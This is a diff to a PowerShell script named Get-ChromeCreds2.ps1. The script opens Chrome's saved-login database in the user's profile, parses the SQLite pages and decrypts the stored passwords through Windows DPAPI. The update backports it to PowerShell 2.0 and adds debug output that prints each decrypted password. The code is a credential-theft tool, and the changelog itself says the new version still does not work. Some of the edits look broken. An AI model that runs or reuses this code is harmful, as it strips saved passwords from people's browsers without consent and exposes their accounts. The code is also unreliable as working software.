@@ -2,8 +2,12 @@
 #  Name:    Get-ChromeCreds2.ps1
 #  Author:  Kerry Milan
 #  Date:    2017/04/28
-#  Version: 1.0
+#
+#  Updated by: Patrick Hurd
+#  Date:       2020/03/11
+#  Version: 2.0
 #  Changelog:
+#   - 2.0: Backport to Powershell 2.0 (Windows 7 default) [Doesn't Work Still]
 #   - 1.0: Initial version
 #
 #  Parse a SQLite database containing Google Chrome credentials
@@ -17,6 +21,7 @@
 
 # Use the default location in the current user's profile
 $User = $Env:USERPROFILE
+# TODO: Change "Default" to "Profile X" where X is the profile number
 $DbFile = "$User\AppData\Local\Google\Chrome\User Data\Default\Login Data"
 $Stream = New-Object IO.FileStream -ArgumentList "$DbFile", 'Open', 'Read', 'ReadWrite'
 
@@ -32,7 +37,7 @@ $Stream.Close()
 #  Length of various non-string field types in a record.  Derived from 
 #  https://www.sqlite.org/fileformat2.html#record_format
 ##
-$SerialMap = [Ordered]@{0=0; 1=1; 2=2; 3=3; 4=4; 5=5; 6=6; 7=8; 8=0; 9=0}
+$SerialMap = @(0, 1, 2, 3, 4, 5, 6, 8, 0, 0)
 
 ##
 #  Convert a byte array to int32
@@ -45,13 +50,42 @@ Function ToInt($ByteArray)
     [int32] $Int = 0
     $x = 0
 
-    # Read $ByteArray one byte at a time, appending to $Int
+    #Read $ByteArray one byte at a time, appending to $Int
     Do
     {
-        $Int = ($Int -shl 0x8) -bor ($ByteArray[$x++])
+        $Int = bitshift $Int -Left 8
+        $Int = $Int -bor ($ByteArray[$x++])
     } While ($x -lt $ByteArray.Length)
 
     Return $Int
+    
+    #Return [bitconverter]::ToInt32($bytes,0)
+}
+
+function bitshift {
+    param(
+        [Parameter(Mandatory=$True,Position=0)]
+        [int]$x,
+
+        [Parameter(ParameterSetName='Left')]
+        [ValidateRange(0,2147483647)]
+        [int]$Left,
+
+        [Parameter(ParameterSetName='Right')]
+        [ValidateRange(0,2147483647)]
+        [int]$Right
+    ) 
+
+    $shift = if($PSCmdlet.ParameterSetName -eq 'Left')
+    { 
+        $Left
+    }
+    else
+    {
+        -$Right
+    }
+
+    return [math]::Floor($x * [math]::Pow(2,$shift))
 }
 
 ##
@@ -69,7 +103,8 @@ Function ParseVarint($ByteArray, [ref]$VarintSize)
 
         # Shift $Val left by 7 bits, then append the least significant 7 bits 
         # of the current byte.
-        $Val = ($Val -shl 0x7) -bor ($Byte -band 0x7F)
+        $val = bitshift $val -Left 7
+        $Val = $Val -bor ($Byte -band 0x7F)
 
     # Continue if 1) we haven't processed 8 bytes already, and 2) the high-order 
     # bit of the current byte is 1.
@@ -101,6 +136,8 @@ Function ParsePage($Page)
     If ($Page[0] -ne 0x0D) { Return }
 
     $NumCells = ToInt $Page[0x3..0x4]
+    If ($NumCells -eq 0) { Return }
+    Write-Output "Cells $NumCells"
     $CellAddrStart = 0x8
     $CellAddrStop = $CellAddrStart + ($NumCells * 2) - 1
 
@@ -126,6 +163,7 @@ Function ParseCell($Cell)
 
     # Payload Length varint
     $PayloadLength = ParseVarint ($Cell[$Offset .. ($Offset + 4)]) $VarintSize
+    #write-output $PayloadLength
     $Offset += $VarintSize.Value
 
     # Row ID varint
@@ -198,6 +236,7 @@ Function ParsePayload($Payload)
         If ($f -eq 0) { $URL = $Str }
         ElseIf ($f -eq 3) { $Username = $Str }
         ElseIf ($f -eq 5) { $Password = DecodePassword($Payload[$Offset .. ($Offset + $FieldSeq[$f] - 1)]) }
+        Write-Output $Password
         $Offset += $FieldSeq[$f]
     }
 
@@ -209,6 +248,7 @@ Function ParsePayload($Payload)
         $PW | Add-Member -type NoteProperty -name Username -value $Username
         $PW | Add-Member -type NoteProperty -name Password -value $Password      
         $PW
+        Write-Output $PW
     }
 }
 
@@ -224,21 +264,28 @@ Function DecodePassword($Password)
     Try
     {
         $Decrypt = [System.Security.Cryptography.ProtectedData]::Unprotect($Password,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-        Return [System.Text.Encoding]::Default.GetString($Decrypt)
+        Write-Output [System.Text.Encoding]::Default.GetString($Decrypt)
     }
     Catch { Return "" }
 
 }
 
+#write-output $BinaryText[0 .. 5]
+#write-output @('S', 'Q', 'L', 'i', 't', 'e')
+
 # Verify the header; exit if $DbFile is not a SQLite database.
 If ((Compare-Object $BinaryText[0x0 .. 0x5] @('S', 'Q', 'L', 'i', 't', 'e')) -ne $null)
 {
     Break
+} Else {
+    Write-Output "Is an SQLite file"
 }
 
 # Grab the number of pages and page size out of the header
 $NumPages = ToInt($BinaryText[0x1C .. 0x1F])
+Write-Output $NumPages
 $PageSize = ToInt($BinaryText[0x10 .. 0x11])
+Write-Output $PageSize
 
 # Start at Page 3 since Page 1 contains the sqlite_master table and Page 2 is a Ptrmap page 
 For ($x = 0x2; $x -lt $NumPages; $x++)
@@ -246,3 +293,4 @@ For ($x = 0x2; $x -lt $NumPages; $x++)
     $PageStart = ($x * $PageSize)
     ParsePage $BinaryText[$PageStart .. ($PageStart + $PageSize - 1)]
 }
+
